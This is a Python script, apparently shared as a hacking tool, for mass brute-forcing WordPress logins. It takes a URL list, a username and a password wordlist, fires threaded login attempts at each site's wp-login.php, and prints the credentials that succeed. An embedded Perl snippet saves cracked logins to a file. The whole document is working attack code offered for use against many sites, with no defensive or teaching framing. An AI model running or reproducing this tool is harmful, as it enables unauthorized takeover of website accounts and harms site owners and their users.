from multiprocessing.pool import ThreadPool
import requests, os.path,  argparse
http_proxy  = {"http":"http://127.0.0.1:8080"} # Debug

"""
    Sugestoes?
    fala cmg
    bj

    coded by pype

	if($ver =~ /wordpress_logged_in/ && $ver =~ /path=/ && $ver =~ /302/){
		if ($ver =~ /Location:.*\/wp-admin/) {
			open(xX,">>vuln.txt");
			print xX "http://$site/wp-login.php:$usern:$senha\n";
			close(xX);
			exit(0);
		} else {
			##print "False Positive\r\n";
		}

"""

parser = argparse.ArgumentParser(description = 'Massive Wordpress Bruteforce -  Pype')
parser.add_argument('-urls',action='store',dest='URL_LST',required=True,help="Arquivo com as urls")
parser.add_argument('-u',action='store',dest='user',required=True,help="Usuario")
parser.add_argument('-w',action='store',dest='WRD_LIST',required=True,help="Wordlist")
parser.add_argument('-t',action='store',dest='threads',required=True,help="Numero de Threads")

args = parser.parse_args()

def brute(url):
    b = False
    for pax in PASS:
        crend["pwd"] = pax

        rx = requests.session()
        try:
            r = rx.post("http://"+url+"/wp-login.php",verify=False,timeout=5,data=crend,cookies=coo,proxies=http_proxy,headers=UA,allow_redirects=False)
            if r.status_code == 302:
                if "/wp-admin/" in str(r.headers) and "wordpress_logged_in" in str(r.headers):
                    print "\n   [ Login ] %s -> %s:%s\n" % (url, args.user,pax)
                    #print r.headers #debug
                    b = True
                    break
                elif r.headers["Location"][:5] == "https":
                    url = r.headers["Location"]
            elif r.status_code == 200:
                pass
            else:
                break
        except:
            break
        rx.cookies.clear()

    if b == False:
        print "[ FAILED ] %s " % url

def main():
    print ("""
[+] %s URL Loads
[+] %s Words Loads
[+] %s Threads

[+] Starting - good luck
    """) % (len(URLS),len(PASS),args.threads)

    x = ThreadPool(int(args.threads)).imap_unordered(brute, URLS)
    for x in x:
        if not x:
            pass


if __name__ == '__main__':


    if os.path.exists(args.URL_LST) and os.path.exists(args.WRD_LIST):
        URLS = open(args.URL_LST,"r").read().split()
        PASS = open(args.WRD_LIST,"r").read().split()
        UA = {"User-Agent":"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0"}
        coo = {"wordpress_test_cookie":"WP+Cookie+check"}


        crend = {
            "log":args.user,
            "pwd":"",
            "wp-submit":"Log In",
        }

        main()
    else:
        print ("[-] Arquivos nao encontrados")
